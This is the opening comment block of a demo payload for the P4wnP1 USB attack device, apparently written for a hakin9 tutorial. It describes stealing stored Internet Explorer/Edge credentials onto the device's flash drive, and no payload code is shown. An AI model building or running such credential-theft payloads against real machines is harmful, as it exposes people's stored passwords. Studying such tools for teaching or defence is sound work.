# P4wnP1 demo payload by MaMe82
# ==========================
#
# Steals stored plain credentials of Internet Explorer / Microsoft Edge 
# and stores them on the built-in flash drive
#
# - shows how to deploy a custom drive label to the USB flash drive
# - shows how to access the flash drive from powershell
# - shows how to output a DuckyScript from a dedicated file
# - shows how a multifile payload could be structured in a dedicated sub directory
#
# Note: RNDIS is enabled, but not needed. This is to keep network access
#       while following the tutorial, on payload development writen for hakin9

# assign custom drivelabel to UMS
